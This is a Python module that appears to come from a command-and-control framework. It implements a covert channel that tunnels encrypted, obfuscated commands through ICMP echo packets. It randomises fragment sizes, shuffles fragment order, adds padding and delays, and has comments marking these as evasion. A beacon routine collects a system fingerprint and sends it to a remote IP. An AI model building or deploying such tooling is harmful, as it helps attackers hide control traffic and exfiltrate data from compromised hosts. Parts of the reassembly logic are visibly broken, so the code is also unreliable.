import socket
import struct
import time
import os
import random
import platform
from core.channels import BaseChannel
from core.obfuscation import DataObfuscator

class AdvancedICMPChannel(BaseChannel):
    def __init__(self, config: dict):
        super().__init__(config)
        self.seq_number = random.randint(1000, 65000)
        self.identifier = os.getpid() & 0xFFFF
        self.obfuscator = DataObfuscator()
        self.fragmentation_enabled = config.get('fragmentation', True)
        self.max_fragment_size = random.randint(32, 128)  # Weird sizes for evasion
        
    def init(self) -> bool:
        try:
            if platform.system().lower() == 'windows':
                # Windows raw sockets require admin
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                # WSAIoctl for Windows-specific
                pass
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.available = True
            return True
        except Exception:
            self.available = False
            return False
    
    def is_available(self) -> bool:
        return self.available and self.init()  # Re-check perms
    
    def calculate_checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            w = data[i] << 8 | data[i+1]
            checksum += w & 0xFFFF
            checksum = (checksum >> 16) + (checksum & 0xFFFF)
        return ~checksum & 0xFFFF
    
    def create_fragmented_packet(self, payload: bytes) -> list:
        obfuscated = self.obfuscator.obfuscate(payload)
        if not self.fragmentation_enabled or len(obfuscated) <= self.max_fragment_size:
            return [self._create_packet(obfuscated)]
        
        fragments = []
        for i in range(0, len(obfuscated), self.max_fragment_size):
            chunk = obfuscated[i:i + self.max_fragment_size]
            seq_offset = i // self.max_fragment_size
            frag = self._create_packet(chunk, seq_offset)
            fragments.append(frag)
        random.shuffle(fragments)  # Out-of-order for evasion
        return fragments
    
    def _create_packet(self, payload: bytes, seq_offset: int = 0) -> bytes:
        icmp_type = 8
        icmp_code = 0
        checksum = 0
        sequence = (self.seq_number + seq_offset) % 65535
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, self.identifier, sequence)
        timestamp = struct.pack('!Q', int(time.time() * 1000))  # Anti-cache
        full_data = timestamp + payload + os.urandom(random.randint(4, 16))  # Padding
        checksum = self.calculate_checksum(header + full_data)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, self.identifier, sequence)
        return header + full_data
    
    def send_command(self, command_data: dict, task_id: str) -> bool:
        try:
            encrypted = self.crypto.encrypt(command_data, task_id)
            packets = self.create_fragmented_packet(encrypted.encode())
            for packet in packets:
                self.sock.sendto(packet, (self.config['target_ip'], 0))
                time.sleep(random.uniform(0.01, 0.05))  # Micro-delays
            self.seq_number += 1
            return True
        except Exception:
            return False
    
    def receive_response(self, task_id: str) -> dict:
        self.sock.settimeout(self.config.get('timeout', 2))
        fragments = {}
        start = time.time()
        while time.time() - start < self.config.get('timeout', 2):
            try:
                packet, addr = self.sock.recvfrom(1024)
                if addr[0] == self.config.get('source_ip'):
                    payload = self._parse_packet(packet)
                    if payload:
                        seq = struct.unpack('!H', packet[24:26])[0]  # Extract seq
                        fragments[seq] = payload
                        if len(fragments) == len(self.create_fragmented_packet(b'')):  # Reassemble logic simplified
                            reassembled = self.obfuscator.deobfuscate(b''.join(sorted(fragments.values(), key=lambda x: int(x['seq']))))
                            decrypted = self.crypto.decrypt(reassembled.decode(), task_id)
                            if decrypted:
                                return decrypted
            except socket.timeout:
                continue
        return None
    
    def _parse_packet(self, packet: bytes) -> bytes:
        if len(packet) < 28 or packet[20] != 0:  # Echo reply
            return None
        return packet[28:][8:]  # Skip timestamp
    
    def beacon(self) -> bool:
        from utilities.fingerprint import SystemFingerprint
        fp = SystemFingerprint().collect()
        return self.send_command({'type': 'beacon', 'fingerprint': fp}, '')
    
    def teardown(self):
        if hasattr(self, 'sock'):
            self.sock.close()
